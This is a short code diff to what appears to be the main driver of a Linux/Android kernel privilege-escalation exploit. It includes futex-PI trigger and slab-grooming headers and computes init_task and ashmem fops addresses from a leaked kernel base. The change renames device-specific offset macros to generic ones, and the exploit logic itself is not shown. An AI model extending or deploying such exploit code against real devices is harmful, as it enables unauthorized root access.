@@ -10,7 +10,7 @@
 
 #include "07_futex_pi_trigger.h"
 #include "05_mm_slab_grooming.h"
-#include "target_zzhl.h"
+#include "target.h"
 
 int main(int argc, char **argv) {
   if (argc != 2) {
@@ -18,9 +18,9 @@ int main(int argc, char **argv) {
     return 2;
   }
   uint64_t kernel_base = strtoull(argv[1], NULL, 16);
-  uint64_t init_task_addr = kernel_base + ZZHL_INIT_TASK_OFF;
+  uint64_t init_task_addr = kernel_base + TARGET_INIT_TASK_OFF;
   uint64_t ashmem_misc_fops_addr =
-      kernel_base + ZZHL_ASHMEM_MISC_FOPS_OFF;
+      kernel_base + TARGET_ASHMEM_MISC_FOPS_OFF;
 
   fprintf(stderr,
           "kernel_base=%016llx init_task=%016llx ashmem_misc_fops=%016llx\n",
